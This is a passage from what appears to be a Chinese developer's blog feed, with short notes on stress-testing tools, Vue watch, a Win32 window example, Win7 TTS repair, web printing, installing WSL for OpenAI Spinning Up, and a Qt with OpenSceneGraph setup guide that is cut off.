<h2 id="性能计数器"><a href="#性能计数器" class="headerlink" title="性能计数器"></a>性能计数器</h2><p>性能计数器描述服务器或操作系统性能的一些数据指标。如System Load、对象与线程数、内存使用、CPU使用、磁盘与网络I/O等使用情况。通过对这些指标设置报警阈值，当监控系统发现性能计数器超过阈值时，就向开发人员和运维报警，及时发现异常并处理。</p>
<h1 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h1><p>压力测试工具有http_load、apache ab、siege。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95" target="_blank" rel="noopener">压力测试</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%A3%93%E5%8A%9B%E6%B8%AC%E8%A9%A6_(%E8%BB%9F%E9%AB%94)" target="_blank" rel="noopener">压力测试 (软件)</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/sunshineliulu/p/7509810.html" target="_blank" rel="noopener">网站性能测试指标及网站压力测试</a>,by 呦呦鹿鸣.</li>
<li><a href="https://juejin.im/entry/5913d544da2f600064deb31d" target="_blank" rel="noopener">Web 性能压测工具 ApacheBench（ab）使用总结</a>,by juejin.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuejs中watch无法监听属性变化的问题</title>
    <url>/2022/10/14/Vuejs%E4%B8%ADwatch%E6%97%A0%E6%B3%95%E7%9B%91%E5%90%AC%E5%B1%9E%E6%80%A7%E5%8F%98%E5%8C%96%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>vuejs的watch当值第一次绑定的时候，不会执行监听函数。可使用immediate:true解决。比如当父组件向子组件动态传值时，子组件props首次获取到父组件传来的默认值时，也需要执行函数，此时就需要将immediate设为true:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">  el: &#39;#root&#39;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    cityName: &#39;&#39;</span><br><span class="line">  &#125;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    cityName: &#123;</span><br><span class="line">    　　handler(newName, oldName) &#123;</span><br><span class="line">      　　&#x2F;&#x2F; ...    　　&#125;,</span><br><span class="line">    　　immediate: true</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/6986889016285085732" target="_blank" rel="noopener">vue watch用法 及 immediate和handler</a>,by Li同志103649.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32消息循环及窗口创建注册示例</title>
    <url>/2021/12/19/Win32%E6%B6%88%E6%81%AF%E5%BE%AA%E7%8E%AF%E5%8F%8A%E7%AA%97%E5%8F%A3%E5%88%9B%E5%BB%BA%E6%B3%A8%E5%86%8C%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<p>学习Windows应用程序的创建过程对理解OSG的Win32图形上下文有帮助。</p>
<h1 id="Windows应用程序的创建过程"><a href="#Windows应用程序的创建过程" class="headerlink" title="Windows应用程序的创建过程"></a>Windows应用程序的创建过程</h1><p>实现窗口创建的六步骤：</p>
<ol>
<li>创建一个窗口首先要注册一个窗口类，初始化wndclass中的各个域，设置窗口过程函数。</li>
<li>调用RigisterClass来注册这个窗口类。</li>
<li>创建窗口。CreateWindow</li>
<li>显示窗口。ShowWindow</li>
<li>刷新窗口。UpdateWindow</li>
<li>消息循环。</li>
</ol>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Win32GUIMsg.cpp : 定义应用程序的入口点。</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;Win32GUIMsg.h&quot;</span><br><span class="line"></span><br><span class="line">#define MAX_LOADSTRING 100</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 全局变量:</span><br><span class="line">HINSTANCE hInst;                                &#x2F;&#x2F; 当前实例</span><br><span class="line">WCHAR szTitle[MAX_LOADSTRING];                  &#x2F;&#x2F; 标题栏文本</span><br><span class="line">WCHAR szWindowClass[MAX_LOADSTRING];            &#x2F;&#x2F; 主窗口类名</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 此代码模块中包含的函数的前向声明:</span><br><span class="line">ATOM                MyRegisterClass(HINSTANCE hInstance);</span><br><span class="line">BOOL                InitInstance(HINSTANCE, int);</span><br><span class="line">LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);</span><br><span class="line">INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);</span><br><span class="line"></span><br><span class="line">int APIENTRY wWinMain(_In_ HINSTANCE hInstance,</span><br><span class="line">                     _In_opt_ HINSTANCE hPrevInstance,</span><br><span class="line">                     _In_ LPWSTR    lpCmdLine,</span><br><span class="line">                     _In_ int       nCmdShow)</span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(hPrevInstance);</span><br><span class="line">    UNREFERENCED_PARAMETER(lpCmdLine);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; TODO: 在此处放置代码。</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 初始化全局字符串</span><br><span class="line">    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);</span><br><span class="line">    LoadStringW(hInstance, IDC_WIN32GUIMSG, szWindowClass, MAX_LOADSTRING);</span><br><span class="line">    MyRegisterClass(hInstance);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 执行应用程序初始化:</span><br><span class="line">    if (!InitInstance (hInstance, nCmdShow))</span><br><span class="line">    &#123;</span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HACCEL hAccelTable &#x3D; LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32GUIMSG));</span><br><span class="line"></span><br><span class="line">    MSG msg;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 主消息循环:</span><br><span class="line">    while (GetMessage(&amp;msg, nullptr, 0, 0))</span><br><span class="line">    &#123;</span><br><span class="line">        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg))</span><br><span class="line">        &#123;</span><br><span class="line">            TranslateMessage(&amp;msg);</span><br><span class="line">            DispatchMessage(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return (int) msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;  函数: MyRegisterClass()</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;  目标: 注册窗口类。</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">ATOM MyRegisterClass(HINSTANCE hInstance)</span><br><span class="line">&#123;</span><br><span class="line">    WNDCLASSEXW wcex;</span><br><span class="line"></span><br><span class="line">    wcex.cbSize &#x3D; sizeof(WNDCLASSEX);</span><br><span class="line"></span><br><span class="line">    wcex.style          &#x3D; CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcex.lpfnWndProc    &#x3D; WndProc;</span><br><span class="line">    wcex.cbClsExtra     &#x3D; 0;</span><br><span class="line">    wcex.cbWndExtra     &#x3D; 0;</span><br><span class="line">    wcex.hInstance      &#x3D; hInstance;</span><br><span class="line">    wcex.hIcon          &#x3D; LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WIN32GUIMSG));</span><br><span class="line">    wcex.hCursor        &#x3D; LoadCursor(nullptr, IDC_ARROW);</span><br><span class="line">    wcex.hbrBackground  &#x3D; (HBRUSH)(COLOR_WINDOW+1);</span><br><span class="line">    wcex.lpszMenuName   &#x3D; MAKEINTRESOURCEW(IDC_WIN32GUIMSG);</span><br><span class="line">    wcex.lpszClassName  &#x3D; szWindowClass;</span><br><span class="line">    wcex.hIconSm        &#x3D; LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));</span><br><span class="line"></span><br><span class="line">    return RegisterClassExW(&amp;wcex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;   函数: InitInstance(HINSTANCE, int)</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;   目标: 保存实例句柄并创建主窗口</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;   注释:</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;        在此函数中，我们在全局变量中保存实例句柄并</span><br><span class="line">&#x2F;&#x2F;        创建和显示主程序窗口。</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)</span><br><span class="line">&#123;</span><br><span class="line">   hInst &#x3D; hInstance; &#x2F;&#x2F; 将实例句柄存储在全局变量中</span><br><span class="line"></span><br><span class="line">   HWND hWnd &#x3D; CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,</span><br><span class="line">      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);</span><br><span class="line"></span><br><span class="line">   if (!hWnd)</span><br><span class="line">   &#123;</span><br><span class="line">      return FALSE;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ShowWindow(hWnd, nCmdShow);</span><br><span class="line">   UpdateWindow(hWnd);</span><br><span class="line"></span><br><span class="line">   return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;  函数: WndProc(HWND, UINT, WPARAM, LPARAM)</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;  目标: 处理主窗口的消息。</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;  WM_COMMAND  - 处理应用程序菜单</span><br><span class="line">&#x2F;&#x2F;  WM_PAINT    - 绘制主窗口</span><br><span class="line">&#x2F;&#x2F;  WM_DESTROY  - 发送退出消息并返回</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">    switch (message)</span><br><span class="line">    &#123;</span><br><span class="line">    case WM_COMMAND:</span><br><span class="line">        &#123;</span><br><span class="line">            int wmId &#x3D; LOWORD(wParam);</span><br><span class="line">            &#x2F;&#x2F; 分析菜单选择:</span><br><span class="line">            switch (wmId)</span><br><span class="line">            &#123;</span><br><span class="line">            case IDM_ABOUT:</span><br><span class="line">                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);</span><br><span class="line">                break;</span><br><span class="line">            case IDM_EXIT:</span><br><span class="line">                DestroyWindow(hWnd);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                return DefWindowProc(hWnd, message, wParam, lParam);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    case WM_PAINT:</span><br><span class="line">        &#123;</span><br><span class="line">            PAINTSTRUCT ps;</span><br><span class="line">            HDC hdc &#x3D; BeginPaint(hWnd, &amp;ps);</span><br><span class="line">            &#x2F;&#x2F; TODO: 在此处添加使用 hdc 的任何绘图代码...</span><br><span class="line">            EndPaint(hWnd, &amp;ps);</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    case WM_DESTROY:</span><br><span class="line">        PostQuitMessage(0);</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        return DefWindowProc(hWnd, message, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; “关于”框的消息处理程序。</span><br><span class="line">INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(lParam);</span><br><span class="line">    switch (message)</span><br><span class="line">    &#123;</span><br><span class="line">    case WM_INITDIALOG:</span><br><span class="line">        return (INT_PTR)TRUE;</span><br><span class="line"></span><br><span class="line">    case WM_COMMAND:</span><br><span class="line">        if (LOWORD(wParam) &#x3D;&#x3D; IDOK || LOWORD(wParam) &#x3D;&#x3D; IDCANCEL)</span><br><span class="line">        &#123;</span><br><span class="line">            EndDialog(hDlg, LOWORD(wParam));</span><br><span class="line">            return (INT_PTR)TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return (INT_PTR)FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/hnfxs/p/3834908.html" target="_blank" rel="noopener">消息循环，注册窗口，创建窗口【图解】</a>,by hnfxs.</li>
<li><a href="https://cdmana.com/2021/12/20211208092918136d.html" target="_blank" rel="noopener">Windows消息循环理解及窗体创建步骤</a>,by LUCKYONE906.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Win7系统TTS修复方法</title>
    <url>/2023/01/30/Win7%E7%B3%BB%E7%BB%9FTTS%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>精简版Win7，XP，尤其从网上下载的ghost版本的系统，TTS语音引擎多数被阉割，导致很多语音程序无法进行语音朗读。例如chrome的文本转语音功能就需要调用底层Windows操纵系统的tts语音引擎，可使用如下方法测试Windows的TTS语音引擎是否工作正常：</p>
<ul>
<li>打开chrome浏览器，开发其开发者工具。</li>
<li>在Console页，输入如下代码并运行。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var msg&#x3D;new SpeechSynthesisUtterance(&#39;你好，世界！&#39;)</span><br><span class="line">window.speechSynthesis.speak(msg)</span><br></pre></td></tr></table></figure></li>
<li>如果能合成语音，说明Windows的tts正常，否则就需要修复。</li>
</ul>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>请参考<a href="http://bbs.nga.cn/read.php?tid=13292628&rand=632" target="_blank" rel="noopener">Win7系统TTS修复-采用原生Win7提取绿色修复</a>，下载对应的修复工具。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://bbs.nga.cn/read.php?tid=13292628&rand=632" target="_blank" rel="noopener">Win7系统TTS修复-采用原生Win7提取绿色修复</a>,by nga.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Web打印方案</title>
    <url>/2022/10/31/Web%E6%89%93%E5%8D%B0%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>想在前端打印word文档，调研一下解决方案。</p>
<h1 id="Vuejs解决方案"><a href="#Vuejs解决方案" class="headerlink" title="Vuejs解决方案"></a>Vuejs解决方案</h1><p>请参考<a href="https://juejin.cn/post/7032139753692594184" target="_blank" rel="noopener">记录超简单实现打印，window.print() 分页打印，vue element-ui window.print()打印</a>。</p>
<h1 id="print样式调试"><a href="#print样式调试" class="headerlink" title="print样式调试"></a>print样式调试</h1><p>请参考<a href="https://stackoverflow.com/questions/726825/how-do-you-debug-printable-css" target="_blank" rel="noopener">How do you debug printable CSS?</a>。</p>
<h1 id="打印页面样式设置"><a href="#打印页面样式设置" class="headerlink" title="打印页面样式设置"></a>打印页面样式设置</h1><p>请参考<a href="https://www.jianshu.com/p/4943ae92b812" target="_blank" rel="noopener">css 打印print</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/359323791" target="_blank" rel="noopener">web打印，一篇搞定</a>,by 俊劫​.</li>
<li><a href="https://blog.csdn.net/weixin_52509007/article/details/124998374" target="_blank" rel="noopener">window.print()打印样式不生效的问题</a>,by 很远有多远.</li>
<li><a href="https://blog.csdn.net/weixin_43865196/article/details/126616516" target="_blank" rel="noopener">window.print() 前端页面打印与预览PDF</a>,by 小何开发.</li>
<li><a href="https://juejin.cn/s/window.print%E6%89%93%E5%8D%B0%E4%B8%8D%E5%85%A8%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3" target="_blank" rel="noopener">window.print打印不全如何解决</a>,by juejin.</li>
<li><a href="https://kakadodo.github.io/2018/03/13/css-media-print-setting/" target="_blank" rel="noopener">关于@media print 的二三事..</a>,by kakadodo.</li>
<li><a href="https://juejin.cn/post/7032139753692594184" target="_blank" rel="noopener">记录超简单实现打印，window.print() 分页打印，vue element-ui window.print()打印</a>,by 程序员李钟意.</li>
<li><a href="https://stackoverflow.com/questions/726825/how-do-you-debug-printable-css" target="_blank" rel="noopener">How do you debug printable CSS?</a>,by stackoverflow.</li>
<li><a href="https://www.jianshu.com/p/4943ae92b812" target="_blank" rel="noopener">css 打印print</a>,by 恬雅过客.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10安装Linux子系统</title>
    <url>/2021/06/07/Win10%E5%AE%89%E8%A3%85Linux%E5%AD%90%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>OpenAI的Spinning Up项目仅在 Linux 和 OSX 上支持Spinning Up，因此想在Win10系统中安装Linux子系统，以便将Spinning Up项目运行起来，学习一下强化学习。</p>
<h1 id="安装Linux子系统"><a href="#安装Linux子系统" class="headerlink" title="安装Linux子系统"></a>安装Linux子系统</h1><p>步骤如下：</p>
<ol>
<li>打开控制面板，选择应用，点击左上角的程序和功能，在弹出窗口中点击启动或关闭Windows功能，勾选适用Linux的Windows子系统。</li>
<li>打开Store商店，安装Ubuntu 20.04操作系统。</li>
</ol>
<h1 id="配置Spinning-Up项目"><a href="#配置Spinning-Up项目" class="headerlink" title="配置Spinning Up项目"></a>配置Spinning Up项目</h1><p>步骤如下：</p>
<ul>
<li>打开cmd，输入wsl命令，进入ubuntu系统。</li>
<li>下载并安装Xming。</li>
<li>使用如下命令安装x11-apps。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install x11-apps</span><br><span class="line">export DISPLAY&#x3D;localhost:0.0 </span><br><span class="line">nano ~&#x2F;.bashrc  #(add  export DISPLAY&#x3D;localhost:0.0   at the end. Ctrl+X to exit&#x2F;save)</span><br></pre></td></tr></table></figure>

<ul>
<li>下载并安装miniconda。</li>
<li>创建Python虚拟环境。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建虚拟环境</span><br><span class="line">conda create -n spinningup python&#x3D;3.7</span><br><span class="line"># 查看虚拟环境</span><br><span class="line">conda info -h</span><br><span class="line"># 删除创建的虚拟环境</span><br><span class="line">conda remove -n spinningup --all</span><br></pre></td></tr></table></figure>

<ul>
<li>激活Python虚拟环境。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda activate spinningup</span><br></pre></td></tr></table></figure>

<ul>
<li>反激活Python虚拟环境。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda deactivate</span><br></pre></td></tr></table></figure>

<ul>
<li>安装openmpi组件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install libopenmpi-dev</span><br></pre></td></tr></table></figure>

<ul>
<li>安装opengl组件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-opengl</span><br></pre></td></tr></table></figure>

<ul>
<li>下载Spinning Up项目</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;openai&#x2F;spinningup.git</span><br><span class="line">cd spinningup</span><br><span class="line">pip install -e . -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br></pre></td></tr></table></figure>

<ul>
<li>测试项目</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 运行登陆器</span><br><span class="line">python -m spinup.run ppo --hid &quot;[32,32]&quot; --env LunarLander-v2 --exp_name installtest --gamma 0.999</span><br><span class="line"># 绘图</span><br><span class="line">python -m spinup.run plot &#x2F;mnt&#x2F;i&#x2F;project&#x2F;spinningup&#x2F;data&#x2F;installtest&#x2F;installtest_s0 </span><br><span class="line"># 视频</span><br><span class="line">python -m spinup.run test_policy &#x2F;mnt&#x2F;i&#x2F;project&#x2F;spinningup&#x2F;data&#x2F;installtest&#x2F;installtest_s0</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://segmentfault.com/a/1190000022865557" target="_blank" rel="noopener">WSL Linux 子系统，真香！附完整实操</a>,by 猴哥一一.</li>
<li><a href="https://www.cnblogs.com/csu-lmw/p/10074746.html" target="_blank" rel="noopener">在 Windows 10 中使用 OpenAI Spinning Up </a>,by csu.</li>
<li><a href="https://codeantenna.com/a/aB79eRvSye" target="_blank" rel="noopener">Anaconda创建环境、删除环境、环境重命名</a>,by CodeAntenna.</li>
<li><a href="https://github.com/openai/gym/issues/2443" target="_blank" rel="noopener">[Bug Report] contextlib has no attribute ‘nullcontext’ for Python3.6 when calling register()</a>,by github.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下QT与OSG开发环境配置</title>
    <url>/2019/10/10/Windows%E4%B8%8BQT%E4%B8%8EOSG%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>最近想尝试使用QT开发图形用户界面，OSG负责三维展示的解决方案，于是研究了一下Windows下OSG的编译安装配置，以及在QT中集成OSG的配置过程。过程记录如下：</p>
<h1 id="QT-OSG开发环境配置"><a href="#QT-OSG开发环境配置" class="headerlink" title="QT+OSG开发环境配置"></a>QT+OSG开发环境配置</h1><p>QT+OSG开发环境配置将使用QT Creator集成环境进行图形用户界面开发，使用Desktop Qt 5.9.8 MSVC2017 64构建套件编译链接调试C++程序。</p>
<h2 id="Visual-Studio-Community-2017-下载安装"><a href="#Visual-Studio-Community-2017-下载安装" class="headerlink" title="Visual Studio Community 2017 下载安装"></a>Visual Studio Community 2017 下载安装</h2><p>下载安装Visual Studio Community 2017的“使用C++的桌面开发”工作负载。这将为QT提供MSVC2017 64bit编译套件。</p>
<h2 id="CDB-调试器下载安装"><a href="#CDB-调试器下载安装" class="headerlink" title="CDB 调试器下载安装"></a>CDB 调试器下载安装</h2><p>没有安装CDB调试器，QT的Desktop Qt 5.9.8 MSVC2017 64构建套件前会出现感叹号，并且使用该构建套件调试时会报“Unable to create a debugging engine”错误。CDB调试器下载安装方法参考<a href="https://dlonng.com/posts/qt-osg" target="_blank" rel="noopener">QT - OSG 开发环境配置</a></p>
<h2 id="QT-5-9-8-下载安装"><a href="#QT-5-9-8-下载安装" class="headerlink" title="QT 5.9.8 下载安装"></a>QT 5.9.8 下载安装</h2><p>QT 5.9.8是 LTS 版本，其下载安装请参考<a href="https://huangwang.github.io/2019/10/07/Qt5%E9%85%8D%E7%BD%AE%E5%BC%80%E6%BA%90GSL%E6%95%B0%E5%AD%A6%E5%BA%93/">Qt5配置开源GSL数学库</a>。<strong>需要注意的是，QT 5.9.8安装过程，选择MSVC2017 64bit编译组件，如图1所示。</strong></p>
<p align="center">
    <img src="images/qt_install.jpg" width="60%" alt="QT 5.9.8安装选择MSVC2017 64bit编译组件"/>
</p>
<center>图1 QT 5.9.8安装选择MSVC2017 64bit编译组件</center>

<h2 id="cmake下载安装"><a href="#cmake下载安装" class="headerlink" title="cmake下载安装"></a>cmake下载安装</h2><p>到 cmake 官网下载安装 cmake，用于osg的编译安装。</p>
<h1 id="下载编译安装OSG"><a href="#下载编译安装OSG" class="headerlink" title="下载编译安装OSG"></a>下载编译安装OSG</h1><h2 id="下载OSG及相关软件"><a href="#下载OSG及相关软件" class="headerlink" title="下载OSG及相关软件"></a>下载OSG及相关软件</h2><p>Windows平台编译安装OSG需下载从OSG官网以下资料：</p>
<ul>
<li>OpenSceneGraph 3.6.4源代码</li>
<li>OpenSceneGraph-Data-3.4.0，因为找不到3.6.4版本的数据</li>
<li>3rdParty_VS2017_v141_x64_V11_full</li>
</ul>
<h2 id="配置OSG"><a href="#配置OSG" class="headerlink" title="配置OSG"></a>配置OSG</h2><p>打开cmake，选择osg源代码路径和osg源代码构建的路径，再点击“configure”按钮，选择Visual Studio 15 2017 Win64编译套件，配置osg如图2所示。</p>
<p align="center">
    <img src="images/cmake_config.jpg" width="100%" alt="cmake编译osg配置"/>
</p>
<center>图2 cmake编译osg配置</center>

<p>需要配置的地方主要有：</p>
<ul>
<li>ACTUAL_3rdparty_DIR：配置第三方库的目录</li>
<li>Build_OSG_EXAMPLES：选中即编译安装OSG的示例。</li>
<li>CMAKE_INSTALL_PREFIX：设置OSG的安装目录，通常放到C盘以外的地方，防止因权限问题安装失败。</li>
</ul>
<p>配置完成后，再持续点击“configure”按钮，知道红色警告消失。然后点击“Generate”按钮生成vs2017工程。</p>
<h2 id="编译OSG"><a href="#编译OSG" class="headerlink" title="编译OSG"></a>编译OSG</h2><p>在cmake中点击“Open Project”按钮，即使用 VS2017 打开 build 文件夹下的工程，点击：生成 -&gt; 批生成 -&gt; 生成 Debug 和 Release 版本的 All_BUILD 即可。</p>
<h2 id="安装OSG"><a href="#安装OSG" class="headerlink" title="安装OSG"></a>安装OSG</h2><p>右击解决方案的 Install 项目，点击生成，然后 Debug 平台的库文件就开始安装了，同理选择 Release 平台再重复安装。之后就可以在安装路径中看到编译的库文件了，安装路径由变量CMAKE_INSTALL_PREFIX的配置决定。</p>
<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>OSG官方文档 <a href="http://www.openscenegraph.org/index.php/documentation/platform-specifics/windows/37-visual-studio" target="_blank" rel="noopener">Windows Compiling with Visual Studio</a>指出，OSG安装完成后需要配置如下环境变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OSG_ROOT points to the base of the OSG file structure (the directory that contains include, src etc. subdirectories)</span><br><span class="line">OSG_BIN_PATH &#x3D; %OSG_ROOT%\bin</span><br><span class="line">OSG_INCLUDE_PATH &#x3D; %OSG_ROOT%\include</span><br><span class="line">OSG_LIB_PATH &#x3D; %OSG_ROOT%\lib</span><br><span class="line">OSG_SAMPLES_PATH &#x3D; %OSG_ROOT%\share\OpenSceneGraph\bin</span><br><span class="line">OSG_FILE_PATH &#x3D; ???\OpenSceneGraph-Data-X.X</span><br><span class="line">OPENSCENEGRAPH_VERSION &#x3D; 3.6.4 </span><br><span class="line">PATH 添加：%OSG_ROOT%\bin;%OSG_ROOT%\bin\osgPlugins-%OPENSCENEGRAPH_VERSION%; 这两个是配置 bin 和插件的路径。</span><br></pre></td></tr></table></figure>

<h1 id="OSG测试"><a href="#OSG测试" class="headerlink" title="OSG测试"></a>OSG测试</h1><h2 id="命令行测试"><a href="#命令行测试" class="headerlink" title="命令行测试"></a>命令行测试</h2><p>打开 cmd 命令行，输入osgversion，输出当前 osg 版本说明环境变量配置成功了，再来看看能不能导入模型文件，接着键入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">osgviewer cow.osg</span><br></pre></td></tr></table></figure>

<p>这里可能会提示系统缺少 zlibd.dll，解决方法很简单：</p>
<ul>
<li>拷贝第三方库的 dll 目录下的 zlib.dll 和 zlibd.dll 到 OSG 安装目录的 bin 目录中。</li>
<li>拷贝第三方库的 lib 目录下的 zlib.dll 和 zlibd.dll 到 OSG 安装目录的 lib 目录中。</li>
</ul>
<p>这时重新键入上面的命令，就可以看到一头经典的 3D 牛了，说明 OSG 安装成功了。</p>
<h2 id="QT-配置-OSG-库路径"><a href="#QT-配置-OSG-库路径" class="headerlink" title="QT 配置 OSG 库路径"></a>QT 配置 OSG 库路径</h2><p>新建一个 QT 的控制台项目，编辑 .pro 文件，加入 OSG 库的路径：</p>
